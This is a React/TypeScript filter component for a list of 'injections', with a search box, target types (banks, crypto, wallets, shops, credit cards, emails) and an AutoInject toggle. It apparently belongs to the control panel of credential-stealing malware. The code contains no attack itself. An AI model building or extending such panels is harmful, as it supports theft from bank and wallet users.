import React from "react";
import {Col, Input, Row, Select} from "antd";
import {BankFilled, CreditCardFilled, MailFilled, ShopFilled, WalletFilled} from "@ant-design/icons";
import {BitcoinIcon} from "../../Misc/CustomIcons";
import {useDispatch} from "react-redux";
import {changeInjectsFilters} from "../../../Store/Injections/Actions";

const {Option} = Select;
const {Search} = Input;

interface InjectionsFilterProps {
    isLoaded: boolean,
}

const InjectionsFilter: React.FC<InjectionsFilterProps> = (props: InjectionsFilterProps) => {
    const dispatch = useDispatch();

    const changeTypeFilter = (type: string) => {
        dispatch(changeInjectsFilters({
            type: type,
        }));
    };

    const autoInjectFilter = (value: boolean|null) => {
        dispatch(changeInjectsFilters({
            autoInjects: value === undefined ? null : value,
        }));
    };

    return (
        <div className="panel-content">
            <Row gutter={15}>
                <Col xl={6} lg={8} md={12} sm={24} xs={24} style={{marginBottom: 15}} >
                    <Search
                        className="panel-select"
                        placeholder="Search..."
                        enterButton="Search"
                        loading={!props.isLoaded}
                        allowClear
                        onSearch={(searchQuery: string) => {
                            dispatch(changeInjectsFilters({
                                query: searchQuery,
                            }));
                        }}
                    />
                </Col>
                <Col xl={6} lg={8} md={12} sm={24} xs={24} style={{marginBottom: 15}} >
                    <Select
                        // mode="multiple"
                        className="panel-select"
                        optionLabelProp="label"
                        placeholder="Type"
                        allowClear
                        onChange={changeTypeFilter}
                    >
                        <Option
                            value="banks"
                            label={(
                                <>
                                    <BankFilled/> Banks
                                </>
                            )}
                        >
                            <BankFilled/> Banks
                        </Option>
                        <Option
                            value="crypt"
                            label={(
                                <>
                                    <BitcoinIcon/> Crypt
                                </>
                            )}
                        >
                            <BitcoinIcon/> Crypt
                        </Option>
                        <Option
                            value="wallets"
                            label={(
                                <>
                                    <WalletFilled/> Wallets
                                </>
                            )}
                        >
                            <WalletFilled/> Wallets
                        </Option>
                        <Option
                            value="shops"
                            label={(
                                <>
                                    <ShopFilled /> Shops
                                </>
                            )}
                        >
                            <ShopFilled /> Shops
                        </Option>
                        <Option
                            value="credit_cards"
                            label={(
                                <>
                                    <CreditCardFilled /> Credit cards
                                </>
                            )}
                        >
                            <CreditCardFilled /> Credit cards
                        </Option>
                        <Option
                            value="emails"
                            label={(
                                <>
                                    <MailFilled /> Emails
                                </>
                            )}
                        >
                            <MailFilled /> Emails
                        </Option>
                    </Select>
                </Col>
                <Col xl={6} lg={8} md={12} sm={24} xs={24} style={{marginBottom: 15}} >
                    <Select
                        className="panel-select"
                        placeholder="AutoInject"
                        allowClear
                        onChange={autoInjectFilter}
                        defaultValue={null}
                    >
                        <Option value={true}>AutoInject: On</Option>
                        <Option value={false}>AutoInject: Off</Option>
                    </Select>
                </Col>
            </Row>
        </div>
    );
};

export default InjectionsFilter;
